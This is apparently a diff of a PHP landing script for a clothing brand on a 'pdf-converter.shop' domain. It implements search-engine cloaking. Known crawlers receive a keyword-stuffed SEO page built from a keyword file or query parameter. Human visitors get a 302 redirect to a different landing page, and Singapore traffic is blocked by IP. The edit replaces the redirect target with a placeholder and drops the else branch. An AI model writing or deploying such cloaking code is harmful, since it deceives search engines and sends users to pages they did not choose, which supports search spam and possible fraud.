@@ -1,14 +1,15 @@
 <?php
-// =========================================================
-// ✅ HARD BYPASS FOR SITEMAP — ONLY OUTPUT sitemap.php
-// =========================================================
+ob_start();
+
+/* =========================================================
+   ✅ HARD BYPASS FOR SITEMAP — ONLY OUTPUT sitemap.php
+   ========================================================= */
 if (
     isset($_SERVER['REQUEST_URI']) &&
     strpos($_SERVER['REQUEST_URI'], 'sitemap.php') !== false
 ) {
     header("Content-Type: application/xml; charset=UTF-8");
 
-    // Include ONLY sitemap.php URL
     $domain = "https://best-clothing-brand.onrender.com/";
     $today = date('Y-m-d');
 
@@ -26,13 +27,36 @@ if (
     exit;
 }
 
-
-// =========================================================
-// 🚫 Block Singapore traffic (allow Google crawlers / adsbot)
-// =========================================================
+/* =========================================================
+   🤖 USER AGENT
+   ========================================================= */
 $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 
-if (strpos($userAgent, 'googlebot') === false && strpos($userAgent, 'adsbot-google') === false) {
+/* =========================================================
+   ✅ WHITELIST (BOTS + CRON)
+   ========================================================= */
+$whitelistAgents = [
+    'googlebot',
+    'adsbot-google',
+    'bingbot',
+    'duckduckbot',
+    'curl',
+    'wget',
+    'uptimerobot'
+];
+
+$isWhitelisted = false;
+foreach ($whitelistAgents as $agent) {
+    if (strpos($userAgent, $agent) !== false) {
+        $isWhitelisted = true;
+        break;
+    }
+}
+
+/* =========================================================
+   🚫 Block Singapore traffic (NON-WHITELIST ONLY)
+   ========================================================= */
+if (!$isWhitelisted) {
 
     function getClientIP() {
         foreach (['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $key) {
@@ -65,9 +89,9 @@ if (strpos($userAgent, 'googlebot') === false && strpos($userAgent, 'adsbot-goog
     }
 }
 
-// =========================================================
-// 🌐 SEO Keyword Logic
-// =========================================================
+/* =========================================================
+   🌐 SEO KEYWORD LOGIC (UNCHANGED)
+   ========================================================= */
 $domain = "https://pdf-converter.shop";
 $keywordsFile = __DIR__ . '/keywords.txt';
 
@@ -88,9 +112,9 @@ if (isset($_GET['q']) && trim($_GET['q']) !== '') {
 $keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');
 $description = "$keyword We create stylish, comfortable, and affordable clothing for everyday life.";
 
-// =========================================================
-// 🤖 Final Bot Detection & Content Output
-// =========================================================
+/* =========================================================
+   🤖 FINAL BOT DETECTION
+   ========================================================= */
 $googleBots = ['googlebot', 'adsbot-google', 'bingbot', 'duckduckbot'];
 $isBot = false;
 
@@ -101,11 +125,13 @@ foreach ($googleBots as $bot) {
     }
 }
 
+/* =========================================================
+   🤖 BOT CONTENT (SEO)
+   ========================================================= */
 if ($isBot) {
 
     header("Content-Type: text/html; charset=UTF-8");
 
-    // ✅ YOUR FULL HTML OUTPUT (UNCHANGED)
     echo <<<HTML
 
  <!DOCTYPE html>
@@ -368,9 +394,8 @@ document.getElementById("year").textContent = new Date().getFullYear();
 
 HTML;
 
-} else {
-    // ✅ Real humans → Redirect unchanged
-    header("Location: https://clothing-brand-eight.vercel.app/");
-    exit;
-}
+} $redirectUrl = "https://your-landing-page.com/";
+
+header("Location: {$redirectUrl}", true, 302);
+exit;
 ?>
